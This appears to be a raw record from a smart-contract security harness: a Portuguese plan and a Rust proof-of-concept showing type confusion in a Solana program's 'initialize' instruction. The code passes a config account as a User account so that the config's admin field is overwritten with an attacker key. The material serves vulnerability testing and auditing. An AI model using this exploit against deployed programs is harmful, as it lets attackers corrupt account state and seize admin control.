attempts.raw:
{
  "plan": "O programa native `initialize` recebe duas contas: `user_info` (gravavel) e `authority_info`. Ele desserializa `user_info` com `unpack_unchecked` sem verificar discriminador, tratando os primeiros 32 bytes como `User.authority`, e sobrescreve esses bytes com a chave de `authority_info`. O baseline usa uma conta `User` legitima (32 bytes) e uma authority valida, provando que o cenario esta montado. O ataque passa uma conta de outro tipo (por exemplo, uma conta de configuracao com 64 bytes, cujo primeiro campo e um `admin` diferente) como `user_info`; se o programa aceitar, os primeiros 32 bytes da conta de configuracao serao sobrescritos pela chave do atacante, corrompendo o estado. O efeito mede que os primeiros 32 bytes da conta de configuracao apos o ataque sao iguais a chave do atacante, algo que o uso legitimo nao faria.",
  "scenario": "let program_id = env.program_id;

// Conta User legitima: 32 bytes (authority)
let legit_authority = Pubkey::new_unique();
let user_data = legit_authority.to_bytes().to_vec();
let user_account = account(&program_id, &user_data, None);

// Conta de outro tipo: config com 64 bytes (admin + valor)
let config_admin = Pubkey::new_unique();
let config_value: u64 = 12345;
let mut config_data = Vec::new();
config_data.extend_from_slice(config_admin.as_ref());
config_data.extend_from_slice(&config_value.to_le_bytes());
let config_account = account(&program_id, &config_data, None);

// Authority do atacante
let attacker_authority = Pubkey::new_unique();
let attacker_account = wallet(1_000_000_000);

// Instrucao: Init {} (discriminador Borsh do enum: 0u8)
let ix_data = vec![0u8];

// Baseline: user_info = user_account, authority_info = attacker_account
let baseline_ix = env.raw_ix(&ix_data, &[
    AccountMeta::new(user_account_key, false),
    AccountMeta::new_readonly(attacker_authority, false),
]);
let baseline_accounts = vec![
    (user_account_key, user_account.clone()),
    (attacker_authority, attacker_account.clone()),
];
let baseline_result = env.baseline("initialize com User legitimo", &baseline_ix, &baseline_accounts);

// Ataque: user_info = config_account (outro tipo), authority_info = attacker_authority
let attack_ix = env.raw_ix(&ix_data, &[
    AccountMeta::new(config_account_key, false),
    AccountMeta::new_readonly(attacker_authority, false),
]);
let attack_accounts = vec![
    (config_account_key, config_account.clone()),
    (attacker_authority, attacker_account.clone()),
];
let attack_result = env.attack("initialize com conta de config como user", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let config_after = after(&attack_result, &config_account_key);
    let first_32 = &config_after.data()[0..32];
    let overwritten = first_32 == attacker_authority.as_ref();
    env.effect("primeiros 32 bytes da conta de config sobrescritos com a chave do atacante", overwritten);
}"
}

